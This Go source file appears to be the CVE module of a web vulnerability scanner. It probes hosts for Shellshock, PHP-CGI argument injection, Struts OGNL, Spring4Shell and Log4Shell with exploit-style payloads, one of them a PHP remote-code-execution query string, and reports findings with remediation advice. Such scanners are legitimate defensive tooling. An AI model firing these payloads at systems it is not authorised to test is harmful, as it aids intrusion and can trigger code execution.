package cve

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"github.com/erebus/scanner/internal/client"
	"github.com/erebus/scanner/internal/crawler"
	"github.com/erebus/scanner/internal/modules"
)

type Module struct {
	client    *client.Client
	seenHosts sync.Map
}

func New(c *client.Client) *Module { return &Module{client: c} }
func (m *Module) Name() string     { return "cve" }

func (m *Module) Run(ctx context.Context, page crawler.Page) ([]modules.Finding, error) {
	u, err := url.Parse(page.URL)
	if err != nil {
		return nil, nil
	}
	host := u.Scheme + "://" + u.Host
	if _, loaded := m.seenHosts.LoadOrStore(host, struct{}{}); loaded {
		return nil, nil
	}

	var findings []modules.Finding

	if f := m.shellshock(ctx, page.URL); f != nil {
		findings = append(findings, *f)
	}
	if ctx.Err() != nil {
		return findings, nil
	}
	if f := m.phpCGI(ctx, page.URL); f != nil {
		findings = append(findings, *f)
	}
	if ctx.Err() != nil {
		return findings, nil
	}
	if f := m.strutsOGNL(ctx, page.URL); f != nil {
		findings = append(findings, *f)
	}
	if ctx.Err() != nil {
		return findings, nil
	}
	if f := m.spring4Shell(ctx, page.URL); f != nil {
		findings = append(findings, *f)
	}
	if ctx.Err() != nil {
		return findings, nil
	}
	findings = append(findings, m.log4Shell(ctx, page)...)

	return findings, nil
}

// shellshock — CVE-2014-6271 / CVE-2014-7169
const ssMarker = "EREBUS_SS_69f4a2"

func (m *Module) shellshock(ctx context.Context, pageURL string) *modules.Finding {
	// Fetch baseline to rule out pages that already contain the marker string
	baseReq, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
	if err != nil {
		return nil
	}
	baseResp, err := m.client.Do(baseReq)
	if err != nil {
		return nil
	}
	baseBody, err := client.ReadBody(baseResp)
	if err != nil {
		return nil
	}
	if strings.Contains(string(baseBody), ssMarker) {
		return nil // pre-existing content — skip to avoid false positive
	}

	payload := fmt.Sprintf("() { :; }; echo; echo %s", ssMarker)
	for _, header := range []string{"User-Agent", "Referer", "Cookie", "X-Forwarded-For", "Accept-Language"} {
		if ctx.Err() != nil {
			return nil
		}
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set(header, payload)
		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}
		body, err := client.ReadBody(resp)
		if err != nil {
			continue
		}
		if strings.Contains(string(body), ssMarker) {
			return &modules.Finding{
				Module:      "cve",
				Severity:    modules.Critical,
				URL:         pageURL,
				Param:       "header:" + header,
				Payload:     payload,
				Evidence:    fmt.Sprintf("Marker %q echoed in response — Bash CGI executed injected command via %s header", ssMarker, header),
				Detail:      "Shellshock (CVE-2014-6271/7169) — Remote Code Execution via Bash CGI environment variable injection; attacker-controlled headers are evaluated as shell commands",
				CWE:         "CWE-78",
				CVSS:        10.0,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
				Confidence:  modules.Confirmed,
				Remediation: "Upgrade bash to a patched version (>= 4.3 patch 25); disable CGI scripts using bash; use mod_fcgid or PHP-FPM instead",
				Tags:        []string{"cve", "cve-2014-6271", "rce", "shellshock", "cgi"},
			}
		}
	}
	return nil
}

// phpCGI — CVE-2012-1823
// PHP-CGI mishandles query strings starting with '-', allowing argument injection.
// Sending ?-s exposes PHP source code.
func (m *Module) phpCGI(ctx context.Context, pageURL string) *modules.Finding {
	u, err := url.Parse(pageURL)
	if err != nil {
		return nil
	}
	for _, probe := range []struct {
		qs     string
		marker string
		desc   string
	}{
		{"-s", "<?php", "source disclosure via -s flag"},
		{"-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", "<?php", "RCE via auto_prepend_file"},
	} {
		if ctx.Err() != nil {
			return nil
		}
		cu := *u
		cu.RawQuery = probe.qs
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, cu.String(), nil)
		if err != nil {
			continue
		}
		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}
		body, err := client.ReadBody(resp)
		if err != nil {
			continue
		}
		if strings.Contains(string(body), probe.marker) {
			return &modules.Finding{
				Module:      "cve",
				Severity:    modules.Critical,
				URL:         cu.String(),
				Param:       "query string",
				Payload:     "?" + probe.qs,
				Evidence:    fmt.Sprintf("PHP source marker %q in response — %s", probe.marker, probe.desc),
				Detail:      "PHP-CGI argument injection (CVE-2012-1823) — PHP-CGI mishandles query strings beginning with '-', allowing argument injection for source disclosure or RCE via auto_prepend_file",
				CWE:         "CWE-88",
				CVSS:        9.8,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				Confidence:  modules.Confirmed,
				Remediation: "Upgrade PHP to 5.3.12 / 5.4.2 or later; configure the web server to not pass query strings directly to PHP-CGI; use PHP-FPM instead of CGI mode",
				Tags:        []string{"cve", "cve-2012-1823", "rce", "php", "cgi", "arg-injection"},
			}
		}
	}
	return nil
}

// strutsOGNL — CVE-2017-5638 family
// Apache Struts 2 evaluates OGNL expressions embedded in the Content-Type header
// during multipart form parsing, leading to RCE.
func (m *Module) strutsOGNL(ctx context.Context, pageURL string) *modules.Finding {
	// Arithmetic probe: safe, no system calls — just evaluates 999*999
	payload := `%{999*999}`
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, pageURL,
		strings.NewReader(""))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "multipart/form-data; boundary="+payload)
	resp, err := m.client.Do(req)
	if err != nil {
		return nil
	}
	body, err := client.ReadBody(resp)
	if err != nil {
		return nil
	}
	bodyStr := string(body)
	if strings.Contains(bodyStr, "998001") {
		return &modules.Finding{
			Module:      "cve",
			Severity:    modules.Critical,
			URL:         pageURL,
			Param:       "Content-Type",
			Payload:     payload,
			Evidence:    "OGNL arithmetic 999*999=998001 evaluated in Content-Type header",
			Detail:      "Apache Struts OGNL injection (CVE-2017-5638 family) — OGNL expression in Content-Type header evaluated server-side; full RCE is possible by executing arbitrary Java",
			CWE:         "CWE-917",
			CVSS:        10.0,
			CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
			Confidence:  modules.Confirmed,
			Remediation: "Upgrade Apache Struts to 2.3.32 / 2.5.10.1 or later; apply vendor security patch; use a WAF rule blocking OGNL expressions in Content-Type",
			Tags:        []string{"cve", "cve-2017-5638", "rce", "struts", "ognl"},
		}
	}
	// Fingerprint: error body revealing Struts/OGNL processing
	bodyLow := strings.ToLower(bodyStr)
	if strings.Contains(bodyLow, "ognl") && strings.Contains(bodyLow, "struts") {
		return &modules.Finding{
			Module:      "cve",
			Severity:    modules.High,
			URL:         pageURL,
			Param:       "Content-Type",
			Payload:     payload,
			Evidence:    "OGNL/Struts keywords in error response — OGNL processing confirmed",
			Detail:      "Apache Struts OGNL fingerprint (CVE-2017-5638 family) — Struts OGNL processing detected in error response; manual verification with a callback-based PoC is recommended",
			CWE:         "CWE-917",
			CVSS:        8.1,
			CVSSVector:  "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
			Confidence:  modules.Likely,
			Remediation: "Upgrade Apache Struts to 2.3.32 / 2.5.10.1 or later; apply vendor security patch",
			Tags:        []string{"cve", "cve-2017-5638", "struts", "ognl", "fingerprint"},
		}
	}
	return nil
}

// spring4Shell — CVE-2022-22965
// Spring MVC on JDK 9+ allows binding request parameters to Class objects via the
// classLoader, enabling Tomcat log file path manipulation → JSP webshell upload.
// The safe probe checks whether classLoader binding is accessible.
func (m *Module) spring4Shell(ctx context.Context, pageURL string) *modules.Finding {
	u, err := url.Parse(pageURL)
	if err != nil {
		return nil
	}
	q := u.Query()
	q.Set("class.module.classLoader.URLs[0]", "0")
	cu := *u
	cu.RawQuery = q.Encode()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, cu.String(), nil)
	if err != nil {
		return nil
	}
	resp, err := m.client.Do(req)
	if err != nil {
		return nil
	}
	body, err := client.ReadBody(resp)
	if err != nil {
		return nil
	}
	bodyLow := strings.ToLower(string(body))

	classLoaderKeywords := strings.Contains(bodyLow, "invalid property") ||
		strings.Contains(bodyLow, "classloader") ||
		strings.Contains(bodyLow, "class.module") ||
		strings.Contains(bodyLow, "property 'class'")

	// HTTP 400 = Spring DataBinder rejected the classLoader property (vulnerable binding).
	// HTTP 500 = unhandled exception during classLoader property traversal — also indicative.
	if (resp.StatusCode == 400 || resp.StatusCode == 500) && classLoaderKeywords {
		return &modules.Finding{
			Module:      "cve",
			Severity:    modules.Critical,
			URL:         cu.String(),
			Param:       "class.module.classLoader.URLs[0]",
			Payload:     "class.module.classLoader.URLs[0]=0",
			Evidence:    fmt.Sprintf("HTTP %d — Spring MVC classLoader binding accessible: %s", resp.StatusCode, truncate(bodyLow, 100)),
			Detail:      "Spring4Shell (CVE-2022-22965) — Spring MVC classLoader binding is accessible; an attacker can manipulate Tomcat log file paths and suffix to write a JSP webshell, achieving RCE on JDK 9+",
			CWE:         "CWE-94",
			CVSS:        9.8,
			CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
			Confidence:  modules.Likely,
			Remediation: "Upgrade Spring Framework to 5.3.18 / 5.2.20 or later; upgrade Tomcat to 10.0.20 / 9.0.62 / 8.5.78; disallow DataBinder access to Class fields via setDisallowedFields",
			Tags:        []string{"cve", "cve-2022-22965", "rce", "spring", "spring4shell"},
		}
	}
	return nil
}

// log4Shell — CVE-2021-44228
// Log4j2 interpolates JNDI lookups in logged strings. We probe with ${java:vm}
// which, on vulnerable versions, gets interpolated to the JVM description string
// before logging — sometimes visible in verbose error responses.
func (m *Module) log4Shell(ctx context.Context, page crawler.Page) []modules.Finding {
	u, err := url.Parse(page.URL)
	if err != nil {
		return nil
	}
	host := u.Scheme + "://" + u.Host

	// Non-OOB probe: ${java:vm} returns JVM info string on vulnerable Log4j2
	// It is safe — no outbound connection, just string interpolation.
	const javaProbe = "${java:vm}"
	const jvmMarker = "openjdk"

	var findings []modules.Finding

	// Inject in headers and query params
	type injection struct {
		where   string
		setFunc func(*http.Request)
	}

	injections := []injection{
		{"header:X-Api-Version", func(r *http.Request) { r.Header.Set("X-Api-Version", javaProbe) }},
		{"header:User-Agent", func(r *http.Request) { r.Header.Set("User-Agent", javaProbe) }},
		{"header:X-Forwarded-For", func(r *http.Request) { r.Header.Set("X-Forwarded-For", javaProbe) }},
	}

	for k, vs := range u.Query() {
		if len(vs) == 0 {
			continue
		}
		k := k
		injections = append(injections, injection{
			"param:" + k,
			func(r *http.Request) {
				q := r.URL.Query()
				q.Set(k, javaProbe)
				r.URL.RawQuery = q.Encode()
			},
		})
	}

	// Get baseline body to compare against
	baseBody := string(page.Body)

	for _, inj := range injections {
		if ctx.Err() != nil {
			break
		}
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, host+u.RequestURI(), nil)
		if err != nil {
			continue
		}
		inj.setFunc(req)
		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}
		body, err := client.ReadBody(resp)
		if err != nil {
			continue
		}
		bodyLow := strings.ToLower(string(body))
		// JVM description appeared in response but not in baseline
		if strings.Contains(bodyLow, jvmMarker) && !strings.Contains(strings.ToLower(baseBody), jvmMarker) {
			findings = append(findings, modules.Finding{
				Module:      "cve",
				Severity:    modules.Critical,
				URL:         page.URL,
				Param:       inj.where,
				Payload:     javaProbe,
				Evidence:    fmt.Sprintf("JVM info string reflected via ${java:vm} interpolation — Log4j2 JNDI processing confirmed"),
				Detail:      "Log4Shell (CVE-2021-44228) — Log4j2 JNDI interpolation confirmed via ${java:vm}; a full JNDI callback payload (${jndi:ldap://...}) will achieve RCE; deploy an OOB listener for conclusive PoC",
				CWE:         "CWE-917",
				CVSS:        10.0,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
				Confidence:  modules.Likely,
				Remediation: "Upgrade Log4j2 to 2.17.1 (Java 8), 2.12.4 (Java 7), or 2.3.2 (Java 6); set log4j2.formatMsgNoLookups=true as a short-term mitigation; block outbound LDAP/RMI from app servers at the firewall",
				Tags:        []string{"cve", "cve-2021-44228", "log4shell", "rce", "jndi", "log4j"},
			})
			break
		}
	}

	return findings
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}
